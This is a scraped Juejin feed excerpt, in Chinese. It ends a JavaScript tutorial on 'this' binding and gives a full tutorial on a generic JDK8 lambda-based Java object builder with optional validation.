<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p3.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出"henry"，实例正常生效</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58a9a661eade4e5da9cadc93475da495~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=zwaQaMGNZ1tKJvZEDFwDpT8Tgsk%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-9">6. 箭头函数 —— “没有 this” 的 this</h4>
<p>箭头函数里没有自己的<code>this</code>，它的<code>this</code>是<strong>外层非箭头函数的 this</strong>。就像 “小跟班”，永远跟着外层函数的<code>this</code>走，不会被任何绑定规则改变。</p>
<pre><code class="hljs language-ini" lang="ini">function foo() {
    var <span class="hljs-attr">bar</span> = () =&gt; {
        <span class="hljs-attr">this.a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
    }
    bar()<span class="hljs-comment">;</span>
}
var <span class="hljs-attr">obj</span> = {
    a: 1,
    baz: foo
}
obj.baz()<span class="hljs-comment">;</span>
console.log(obj)<span class="hljs-comment">;</span>
</code></pre>
<p>再次灵魂拷问：<code>a</code> 是 1 还是 2 ？ 答案：<code>2</code> ！</p>
<p><strong>关键逻辑：</strong></p>
<ol>
<li><code>obj.baz()</code> 是<strong>隐式绑定</strong>：foo 函数被 obj 调用，所以 foo 里的<code>this</code>指向 obj；</li>
<li>箭头函数<code>bar</code>没有自己的<code>this</code>，直接 “偷” 了外层 foo 的<code>this</code>（也就是 obj）；</li>
<li>执行<code>bar()</code>时，<code>this.a = 2</code> 其实是给<code>obj.a</code>赋值，把原来的 1 改成了 2；</li>
<li>最后打印 obj，a 属性已经变成 2，结果就是 <code>{ a: 2, baz: 函数foo }</code>。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9a92f2c5f224de680f283a132db4316~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=k2qlGEtEpbMiI9nrfxLAAGGJEoM%3D" alt="image.png" loading="lazy"/></p>
<p>OK，是不是觉得自己已经拿捏<code>this</code>了？</p>
<h2 data-id="heading-10">总结</h2>
<p>从 “自由散漫” 的默认绑定、“依附对象” 的隐式绑定，到 “强行指定” 的三个“热心”的室友，再到 “定制化” 的 new 绑定（三种情况），最后是 “粘人跟班” 的箭头函数 —— 只要找准场景对号入座，<code>this</code>就再也不会让你头疼啦！</p>
<blockquote>
<p>掌握<code>this</code>，让你的代码更上一层楼吧!</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JDK8 Lambda 加持：打造优雅通用的对象构建器]]></title>    <link>https://juejin.cn/post/7575119254313648154</link>    <guid>https://juejin.cn/post/7575119254313648154</guid>    <pubDate>2025-11-23T07:19:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575119254313648154" data-draft-id="7575182522411040806" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JDK8 Lambda 加持：打造优雅通用的对象构建器"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-11-23T07:19:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="只会写代码"/> <meta itemprop="url" content="https://juejin.cn/user/995479086189514"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JDK8 Lambda 加持：打造优雅通用的对象构建器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/995479086189514/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    只会写代码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T07:19:29.000Z" title="Sun Nov 23 2025 07:19:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在日常 Java 开发中，对象构建是高频操作。传统的<code>new 对象 + 链式setter</code>或手动编写 Builder 模式，要么代码冗余繁琐，要么需要重复开发模板代码。本文将基于 JDK8 的 Lambda 特性，实现一个通用、优雅、支持灵活校验的对象构建器，彻底解决对象构建的痛点。</p>
<h2 data-id="heading-0">一、痛点回顾：传统对象构建的困境</h2>
<p>先看一个常见场景：创建一个<code>User</code>对象并设置属性，部分属性需要校验（如年龄必须大于 0）。</p>
<h3 data-id="heading-1">1. 传统 setter 模式</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
user.setName(<span class="hljs-string">"张三"</span>);
user.setAge(<span class="hljs-number">25</span>);
user.setEmail(<span class="hljs-string">"zhangsan@xxx.com"</span>);
<span class="hljs-comment">// 校验逻辑散落各处</span>
<span class="hljs-keyword">if</span> (user.getAge() &lt;= <span class="hljs-number">0</span>) {
   <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"年龄必须大于0"</span>);
}
</code></pre>
<ul>
<li>问题：代码冗长，缺乏链式调用的流畅性，校验逻辑与属性设置分离，维护成本高。</li>
</ul>
<h3 data-id="heading-2">2. 手动编写 Builder 模式</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserBuilder</span> {
   <span class="hljs-keyword">private</span> User user;
   <span class="hljs-keyword">private</span> <span class="hljs-title function_">UserBuilder</span><span class="hljs-params">()</span> { user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(); }
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> UserBuilder <span class="hljs-title function_">builder</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserBuilder</span>(); }
   <span class="hljs-keyword">public</span> UserBuilder <span class="hljs-title function_">name</span><span class="hljs-params">(String name)</span> {
       user.setName(name);
       <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
   }
   <span class="hljs-keyword">public</span> UserBuilder <span class="hljs-title function_">age</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
       <span class="hljs-keyword">if</span> (age &lt;= <span class="hljs-number">0</span>) {
           <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"年龄必须大于0"</span>);
       }
       user.setAge(age);
       <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
   }
   <span class="hljs-comment">// 其他属性的setter...</span>
   <span class="hljs-keyword">public</span> User <span class="hljs-title function_">build</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> user; }
}
<span class="hljs-comment">// 使用</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> UserBuilder.builder()
       .name(<span class="hljs-string">"张三"</span>)
       .age(<span class="hljs-number">25</span>)
       .email(<span class="hljs-string">"zhangsan@xxx.com"</span>)
       .build();
</code></pre>
<ul>
<li>问题：每个实体类都要编写对应的 Builder 类，重复代码多；校验逻辑与 Builder 强耦合，灵活性差。
有没有一种方式，既能享受 Builder 模式的链式优雅，又不用编写重复模板代码，还能灵活支持属性校验？答案是：用 JDK8 Lambda 实现通用构建器！</li>
</ul>
<h2 data-id="heading-3">二、核心设计：Lambda 构建器的实现原理</h2>
<p>核心思路：<strong>用函数式接口承接 setter 逻辑，通过 Lambda 表达式简化调用，封装构建逻辑为通用工具类</strong>。
整体结构分为两部分：</p>
<ol>
<li>函数式接口<code>SetterFunction</code>：定义属性设置行为</li>
<li>构建器类<code>InstanceBuilder</code>：封装实例创建、属性设置、校验逻辑</li>
</ol>
<h3 data-id="heading-4">1. 函数式接口：SetterFunction</h3>
<p>这是 Lambda 能生效的核心 —— 必须是<strong>函数式接口</strong>（仅一个抽象方法），用于承接 “对象 + 属性值” 的设置逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
* Setter方法函数式接口
* 承接对象的属性设置行为，为Lambda表达式提供目标类型
* <span class="hljs-doctag">@param</span> &lt;T&gt; 目标对象类型
* <span class="hljs-doctag">@param</span> &lt;P&gt; 属性值类型
*/</span>
<span class="hljs-meta">@FunctionalInterface</span> <span class="hljs-comment">// 显式声明函数式接口（可选，但推荐）</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SetterFunction</span>&lt;T, P&gt; {
    <span class="hljs-comment">/**
    * 执行属性设置
    * <span class="hljs-doctag">@param</span> target 目标对象
    * <span class="hljs-doctag">@param</span> param 要设置的属性值
    */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">(T target, P param)</span>;
    }
</code></pre>
<p>为什么不用 JDK 自带的<code>BiConsumer&lt;T, P&gt;</code>？
<code>BiConsumer</code>的方法名是<code>accept</code>，语义不够明确；而<code>SetterFunction</code>的<code>call</code>方法更直观体现 “执行属性设置” 的意图，且自定义接口可后续扩展（如添加默认方法），灵活性更高。</p>
<h3 data-id="heading-5">2. 核心构建器：InstanceBuilder</h3>
<p>封装实例创建、链式设置、属性校验、实例返回的完整逻辑，提供两种创建方式（新实例 / 现有实例），支持可选校验。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Objects;
<span class="hljs-keyword">import</span> java.util.function.Predicate;

<span class="hljs-comment">/**
 * 实例构建器
 * 用于构建和配置对象实例，支持链式调用设置属性值
 *
 * <span class="hljs-doctag">@param</span> &lt;T&gt; 要构建的实例类型
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;T&gt; {

    <span class="hljs-comment">/** 正在构建的实例对象 */</span>
    <span class="hljs-keyword">private</span> T inst;

    <span class="hljs-comment">/**
     * 私有构造函数 - 基于现有实例创建构建器
     *
     * <span class="hljs-doctag">@param</span> inst 已存在的实例对象
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InstanceBuilder</span><span class="hljs-params">(T inst)</span> {
        <span class="hljs-built_in">this</span>.inst = Objects.requireNonNull(inst, <span class="hljs-string">"Instance cannot be null"</span>);
    }

    <span class="hljs-comment">/**
     * 私有构造函数 - 基于类创建构建器（通过反射实例化）
     *
     * <span class="hljs-doctag">@param</span> instClass 要实例化的类
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">InstanceBuilder</span><span class="hljs-params">(Class&lt;T&gt; instClass)</span> {
        Objects.requireNonNull(instClass, <span class="hljs-string">"instClass cannot be null"</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 使用无参构造函数创建实例</span>
            <span class="hljs-built_in">this</span>.inst = instClass.getDeclaredConstructor().newInstance();
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"Failed to create instance of "</span> + instClass.getName(), e);
        }
    }

    <span class="hljs-comment">/**
     * 静态工厂方法 - 基于现有实例创建构建器
     *
     * <span class="hljs-doctag">@param</span> &lt;T&gt; 实例类型
     * <span class="hljs-doctag">@param</span> inst 已存在的实例对象
     * <span class="hljs-doctag">@return</span> InstBuilder实例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(T inst)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;&gt;(inst);
    }

    <span class="hljs-comment">/**
     * 静态工厂方法 - 基于类创建构建器
     *
     * <span class="hljs-doctag">@param</span> &lt;T&gt; 实例类型
     * <span class="hljs-doctag">@param</span> instClass 要实例化的类
     * <span class="hljs-doctag">@return</span> InstBuilder实例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;T&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">of</span><span class="hljs-params">(Class&lt;T&gt; instClass)</span>{
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstanceBuilder</span>&lt;&gt;(instClass);
    }

    <span class="hljs-comment">/**
     * 设置实例属性值
     * 使用函数式接口方式设置实例的特定属性，支持链式调用
     *
     * <span class="hljs-doctag">@param</span> &lt;V&gt; 属性值类型
     * <span class="hljs-doctag">@param</span> fnSet 设置属性的函数式接口
     * <span class="hljs-doctag">@param</span> v 要设置的属性值
     * <span class="hljs-doctag">@return</span> 当前构建器实例（支持链式调用）
     */</span>
    <span class="hljs-keyword">public</span> &lt;V&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">set</span><span class="hljs-params">(SetterFunction&lt;T, V&gt; fnSet, V v)</span>{
        fnSet.call(inst, v);
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-comment">/**
     * 带校验的set方法（重载，想用时用，不想用还能用原来的）
     * <span class="hljs-doctag">@param</span> fnSet 设置属性的函数式接口
     * <span class="hljs-doctag">@param</span> v 要设置的属性值
     * <span class="hljs-doctag">@param</span> validator 校验器
     * <span class="hljs-doctag">@return</span> 当前构建器实例（支持链式调用）
     * <span class="hljs-doctag">@param</span> &lt;V&gt; 属性值类型
     */</span>
    <span class="hljs-keyword">public</span> &lt;V&gt; InstanceBuilder&lt;T&gt; <span class="hljs-title function_">set</span><span class="hljs-params">(SetterFunction&lt;T, V&gt; fnSet, V v, Predicate&lt;V&gt; validator)</span>{
        <span class="hljs-comment">// 先校验：符合条件才设置属性，不符合就报错</span>
        <span class="hljs-keyword">if</span> (!validator.test(v)) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"属性值不对："</span> + v);
        }
        fnSet.call(inst, v); <span class="hljs-comment">// 校验通过再调用你原有的设置逻辑</span>
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;
    }

    <span class="hljs-comment">/**
     * 构建并返回配置完成的实例
     *
     * <span class="hljs-doctag">@return</span> 构建完成的实例对象
     */</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">build</span><span class="hljs-params">()</span>{
        <span class="hljs-keyword">return</span> inst;
    }
}
</code></pre>
<pre><code class="hljs language-arduino" lang="arduino">核心设计亮点：
* 私有构造 + 静态工厂：限制创建方式，保证实例安全性
* 双重创建支持：既支持新实例创建（反射无参构造），也支持现有实例修改
* 重载 set 方法：普通设置 + 校验设置分离，按需使用，不侵入基础逻辑
* 函数式接口结合：`SetterFunction`承接 setter，`Predicate`承接校验，Lambda 简化调用

## 三、实战用法：<span class="hljs-number">3</span> 分钟上手优雅构建
下面通过 <span class="hljs-number">3</span> 个核心场景，演示如何用这个构建器简化开发。
### 准备工作：定义实体类
先定义一个普通实体类（无需任何改造，无侵入性）：

```java
<span class="hljs-comment">/**
* 普通实体类（无需实现任何接口/注解）
*/</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> name;
    <span class="hljs-keyword">private</span> Integer age;
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> email;
    <span class="hljs-comment">// 无参构造（反射创建必需）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-comment">// getter/setter（常规生成即可）</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> name; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(<span class="hljs-type">String</span> name)</span> </span>{ <span class="hljs-keyword">this</span>.name = name; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> Integer <span class="hljs-title">getAge</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> age; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setAge</span><span class="hljs-params">(Integer age)</span> </span>{ <span class="hljs-keyword">this</span>.age = age; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getEmail</span><span class="hljs-params">()</span> </span>{ <span class="hljs-keyword">return</span> email; }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">setEmail</span><span class="hljs-params">(<span class="hljs-type">String</span> email)</span> </span>{ <span class="hljs-keyword">this</span>.email = email; }
}
</code></pre>
<h3 data-id="heading-6">场景 1：创建新实例（无参构造）</h3>
<p>通过<code>InstanceBuilder.of(Class)</code>创建新实例，链式设置属性：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 构建User实例：无校验</span>
<span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> InstanceBuilder.of(User.class)
    .set(User::setName, <span class="hljs-string">"张三"</span>) <span class="hljs-comment">// Lambda替代setter调用</span>
    .set(User::setAge, <span class="hljs-number">25</span>)
    .set(User::setEmail, <span class="hljs-string">"zhangsan@xxx.com"</span>)
    .build();
System.out.println(user.getName()); <span class="hljs-comment">// 输出：张三</span>
</code></pre>
<h3 data-id="heading-7">场景 2：修改现有实例</h3>
<p>通过<code>InstanceBuilder.of(实例)</code>修改已有对象的属性（适合 DTO 转换、对象更新场景）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 已有实例</span>
<span class="hljs-type">User</span> <span class="hljs-variable">existingUser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
existingUser.setName(<span class="hljs-string">"李四"</span>);
<span class="hljs-comment">// 修改现有实例的属性</span>
<span class="hljs-type">User</span> <span class="hljs-variable">updatedUser</span> <span class="hljs-operator">=</span> InstanceBuilder.of(existingUser)
    .set(User::setAge, <span class="hljs-number">30</span>)
    .set(User::setEmail, <span class="hljs-string">"lisi@xxx.com"</span>)
    .build();
System.out.println(updatedUser.getAge()); <span class="hljs-comment">// 输出：30</span>
System.out.println(updatedUser.getName()); <span class="hljs-comment">// 输出：李四（未修改的属性保留原值）</span>
</code></pre>
<h3 data-id="heading-8">场景 3：带属性校验的构建</h3>
<p>通过<code>set(SetterFunction, value, Predicate)</code>添加校验逻辑（如年龄 &gt; 0、邮箱非空）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">try</span> {
    <span class="hljs-type">User</span> <span class="hljs-variable">validUser</span> <span class="hljs-operator">=</span> InstanceBuilder.of(User.class)
        .set(User::setName, <span class="hljs-string">"王五"</span>, name -&gt; name.length() &gt;= <span class="hljs-number">2</span>) <span class="hljs-comment">// 姓名至少2个字符</span>
        .set(User::setAge, -<span class="hljs-number">5</span>, age -&gt; age &gt; <span class="hljs-number">0</span>) <span class="hljs-comment">// 年龄必须大于0（故意传错值）</span>
        .set(User::setEmail, <span class="hljs-string">"wangwu@xxx.com"</span>, email -&gt; email.contains(<span class="hljs-string">"@"</span>)) <span class="hljs-comment">// 邮箱必须包含@</span>
        .build();
} <span class="hljs-keyword">catch</span> (IllegalArgumentException e) {
    System.out.println(e.getMessage()); <span class="hljs-comment">// 输出：属性值校验失败：-5</span>
}
</code></pre>
<p>校验逻辑灵活可配置，支持任意复杂规则（如多条件组合、正则匹配等）：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 复杂校验：邮箱必须包含@且长度&gt;5</span>
.set(User::setEmail, <span class="hljs-string">"ww@xxx.com"</span>, email -&gt; email.contains(<span class="hljs-string">"@"</span>) &amp;&amp; email.length() &gt; <span class="hljs-number">5</span>)
</code></pre>
<h2 data-id="heading-9">四、核心特性：为什么这个构建器值得用？</h2>
<h3 data-id="heading-10">1. 极简链式调用，代码更优雅</h3>
<p>Lambda 表达式替代了冗长的 setter 调用，链式写法一气呵成，代码可读性大幅提升。</p>
<h3 data-id="heading-11">2. 零侵入性，无需改造实体类</h3>
<p>实体类无需实现任何接口、添加任何注解，也不用编写 Builder 内部类，完全复用原有 getter/setter。</p>
<h3 data-id="heading-12">3. 灵活创建 + 修改，场景全覆盖</h3>
<p>支持 “新实例创建” 和 “现有实例修改” 两种场景，满足对象初始化、DTO 更新、属性批量修改等需求。</p>
<h3 data-id="heading-13">4. 可选校验机制，逻辑解耦</h3>
<p>校验逻辑通过<code>Predicate</code>传入，与属性设置分离，无需侵入实体类或构建器核心逻辑，按需启用。</p>
<h3 data-id="heading-14">5. JDK8 原生支持，无依赖</h3>
<p>仅依赖 JDK8 核心 API（Lambda、函数式接口、反射），无需引入第三方框架（如 Lombok），轻量化无冗余。</p>
<h2 data-id="heading-15">五、对比传统方案：优势一目了然</h2>

































<table><thead><tr><th>方案</th><th>代码简洁度</th><th>侵入性</th><th>校验支持</th><th>复用性</th></tr></thead><tbody><tr><td>传统 new+setter</td><td>低</td><td>无</td><td>差（散落）</td><td>无</td></tr><tr><td>手动编写 Builder</td><td>中</td><td>高（需写内部类）</td><td>中（耦合）</td><td>低（每个实体类单独写）</td></tr><tr><td>本文 Lambda 构建器</td><td>高</td><td>无</td><td>高（灵活）</td><td>高（通用）</td></tr></tbody></table>
<h2 data-id="heading-16">六、总结</h2>
<p>本文基于 JDK8 Lambda 特性，实现了一个通用、优雅、灵活的对象构建器。核心是通过<code>SetterFunction</code>函数式接口承接 setter 逻辑，结合<code>InstanceBuilder</code>封装构建流程，既解决了传统 setter 的繁琐，又避免了手动编写 Builder 的重复劳动。
这个构建器的核心价值在于：<strong>用极简的代码实现强大的功能，同时保持零侵入、高灵活、无依赖</strong>，适合在任何 JDK8 + 项目中使用，尤其适合多属性、需校验、频繁构建对象的场景。</p>
<h2 data-id="heading-17">七、总结</h2>
<p>若你厌倦了手动编写 Builder 的重复模板 —— 新增属性就得同步改 Builder，也受够了传统 setter 的冗长、校验逻辑的耦合，这个 Lambda 构建器正是解方。</p>
<p>它零模板代码、不改造实体类，一行 Lambda 搞定属性设置，校验随用随加，新实例创建或老对象修改都能极简链式承接，还无需第三方依赖，特别适合个人开发场景下快速复用。</p>
<p>下次构建对象时，直接用InstanceBuilder.of(User.class)开篇，体验 “5 行代码替代 20 行传统 Builder” 的清爽。本文前文已完整附上SetterFunction与InstanceBuilder源码，直接复制到项目中，即可重构下一次对象构建。</p>
